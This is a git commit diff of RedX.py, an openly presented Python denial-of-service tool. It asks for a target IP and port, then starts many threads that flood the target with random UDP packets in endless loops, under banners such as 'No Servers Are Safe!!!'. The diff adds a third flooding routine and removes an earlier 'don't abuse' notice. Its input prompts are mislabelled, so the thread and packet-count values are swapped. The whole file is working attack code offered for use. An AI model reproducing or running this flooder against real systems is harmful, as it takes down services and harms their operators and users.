36b6e1c105194348acfbee1d72701a69c157bbd8
Cryspot <94024627+Cryspot@users.noreply.github.com>
2023-02-24 23:35:15 +0700

    Update RedX.py

--- RedX.py
+++ RedX.py
@@ -1,60 +1,80 @@
-#!/usr/bin/env python3
-#Ddos by RedX
 import random
 import socket
 import threading
-import os
+import os,sys
+import time
 
 os.system("clear")
-print("\033[93m")
-print('''\033[94m  Tools By RedX
+time.sleep(2)
+print('''\033[1;31;40m
 ██████╗░███████╗██████ ╗██╗░░██╗
 ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
 ██████╔╝█████╗░░██║░░██║░╚███╔╝
 ██╔══██╗██╔══╝░░██║░░██║░██╔██╗
 ██║░░██║███████╗██████╔╝██╔╝╚██╗
 ╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝
-
-------------------------------------------------------------
-      >Jangan Abuse Ya Maniez<         
-          >Tools By RedX<              
------------------------------------------------------------
 ''')
-ip = str(input("DdosAttackByRedX | ip:"))
-port = int(input("DdosAttackByRedX | port:"))
-choice = str(input("DdosAttackByRedX | Serang Ga Ni?(y/n):"))
-times = int(input("DdosAttackByRedX | Packets:"))
-threads = int(input("DdosAttackByRedX | Threads:"))
+print("\033[94m")
+print("••••••••••••••••••••••••")
+print("Don't Be Afraid To Do The Impossible!!! ")
+print("Just a Little Programmer")
+print("••••••••••••••••••••••••")
+ip = str(input("IP TARGET:"))
+port = int(input("PORT TARGET:"))
+choice = str(input("GAS ATTACK(y/n):"))
+times = int(input("THREAD:"))
+threads = int(input(" TIME :"))
+
+os.system("clear")
 def run():
-        data = random._urandom(1024)
-        i = random.choice(("[*]","[!]","[#]"))
+        data = random._urandom(818)
+        i = random.choice(("[•]","[•]","[•]"))
         while True:
                 try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         addr = (str(ip),int(port))
                         for x in range(times):
                                 s.sendto(data,addr)
-                        print("\033[92m [*] RedX Menyenggol ")
+                        print(i +" Who am I")
                 except:
-                        print("\033[94m [!] RedX IS HERE DUDE! ")
+                        print("[X] No Servers Are Safe!!!")
+
 def run2():
-        data = random._urandom(860)
-        i = random.choice(("[*]","[!]","[#]"))
+        data = random._urandom(1024)
+        i = random.choice(("[•]","[•]","[•]"))
         while True:
                 try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         s.connect((ip,port))
                         s.send(data)
                         for x in range(times):
-                             s.send(data)
-                        print("\033[92m[*] RedX Menyenggol")
+                                s.send(data)
+                        print(i +" Who am I")
                 except:
                         s.close()
-                        print("\033[93m[*] RedX In Here Dude")
+                        print("[X] No Servers Are Safe!!!")
+
+def run3():
+        data = random._urandom(818)
+        i = random.choice(("[•]","[•]","[•]"))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"Who am I")
+                except:
+                        s.close()
+                        print("[X] No Servers Are Safe!!!")
+
 for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
                 th.start()
+                th = threading.Thread(target = run2)
+                th.start()
         else:
-                 th = threading.Thread(target = run2)
-                 th.start()
+                th = threading.Thread(target = run3)
+                th.start()
